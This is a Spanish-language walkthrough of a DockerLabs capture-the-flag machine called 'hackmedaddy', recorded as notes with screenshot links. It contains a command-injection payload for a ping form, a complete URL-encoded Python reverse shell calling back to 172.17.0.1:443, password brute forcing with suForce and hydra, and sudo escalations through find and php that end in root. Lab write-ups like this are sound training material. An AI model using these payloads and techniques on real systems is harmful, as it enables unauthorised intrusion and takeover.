nmap:  22,80

![[dockerlabs/dificil/hackmedaddy/nmap.png]]

---
En la pagina principal hay un botón que cada vez que se presiona cambia de comando y hay un comando en especifico que llamo la atencion:

![[dockerlabs/dificil/hackmedaddy/pagina principal.png]]

esto es lo que aparece en la pagina

> root@hackmedaddy:~# cat README.txt
 d05notfound exploit payload shell bruteforce vulnerability cipher zero-day phishing

lo que igual da un posible usuario: d05notfound

al hacer un gobuster no da varias:

     gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -k


![[dockerlabs/dificil/hackmedaddy/gobuster.png]]

no da tres que nos sirven: Info.txt, flag.txt y robots.txt

dentro de robots.txt
![[dockerlabs/dificil/hackmedaddy/pagina2.png]]

en info.txt:
![[Pasted image 20250103115908.png]]

donde tenemos un usuario: Eliot

y en flag.txt:
![[pagina4.png]]

el primer posible error al final era un parámetro y queda así:
 
    http://172.17.0.2/d05notfound/d05notfound.php

![[dockerlabs/dificil/hackmedaddy/panel1.png]]

donde hay un panel de ejecución de comandos  y funcionamiento del sistema
vamos a la parte final de la pagina donde podemos ejecutar ping, capturamos con burpsuite y probamos si tenemos ping

![[ping1.png]]

ahora probamos y por ejemplo al colocar un comando mas podemos ver los archivos así:
> -c+1+google.com+|+ls+-la

![[ping2.png]]

como se que funciona podemos tirar una reverse shell: https://www.revshells.com/
elegimos la python3 #2



la pegamos en burpsuite y queda así: 

     - comando=-c%2b1%2bgoogle.com%2b|+python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("172.17.0.1",443))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'


mientras esta el terminal en escucha y ahora estamos dentro, hacemos un tratamiento stty y empezamos a escalar

![[dockerlabs/dificil/hackmedaddy/conexion.png]]

en home hay dos usuarios: Eliot y an0n1mat0. una nota 

![[dockerlabs/dificil/hackmedaddy/nota.png]]


entramos con eliot a documentos y hay dos archivos llamados:

      - agenda.txt
      - agenda_password.txt

![[agenda.png]]
![[dockerlabs/dificil/hackmedaddy/nota2.png]]

que contienen nombres y contraseñas, hacemos un tmp un wordlists con eso
hacemos este comando:
> ./suForce -u e1i0t /home/e1i0t/documents/agenda.txt

nos dará que la contraseña es: eliotelmejor

podemos entrar por la misma maquina o por ssh

![[eliot.png]]

al hacer un sudo -l da:
> (an0n1mat0 : an0n1mat0) NOPASSWD: /bin/find

vamos a: https://gtfobins.github.io/gtfobins/find/#sudo

![[dockerlabs/dificil/hackmedaddy/gtf.png]]

después de intentar y ver como pasar con el find encontré como:

![[dockerlabs/dificil/hackmedaddy/usuario2.png]]


dentro de anonimato en home hay un nota.txt que tiene: 

![[notas2.png]]

si vamos a la carpeta raiz > secret > confidencial.txt
dice:

![[dockerlabs/dificil/hackmedaddy/secret.png]]

dice que hay un txt llamado password pero no se donde esta así que utilizamos el comando:
> find / -name "passwords_users.txt" 2>/dev/null

nos da la ruta: /usr/local/bin/passwords_users.txt

llegamos a la ruta y dice: 

![[rutas.png]]

en nuestra terminal ejecutamos: crunch 12 12 abcdefghijklmnopqrstuvwxyz -o numbers -t @@yanonymous

lo pasamos a la maquina victima por wget, nos pasamos a la /tmp

![[wget.png]]


como no tenemos la contraseña de an0n1mat0 hacemos una fuerza bruta con el nombre de usuario que tenemos y con el archivo numbers que sacamos

    hydra -l an0n1mat0 -P numbers ssh://172.17.0.2 

nos da la contraseña: soyanonymous

ahora que tenemos la contraseña podemos hacer el sudo -l que nos da: 
> (ALL : ALL) /bin/php


buscamos otra ves en: https://gtfobins.github.io/gtfobins/php/#sudo

![[php.png]]

ejecutamos: 

     - CMD="/bin/sh"
     - sudo php -r "system('$CMD');"

haremos un bash -p

![[dockerlabs/dificil/hackmedaddy/root.png]]

y somos root!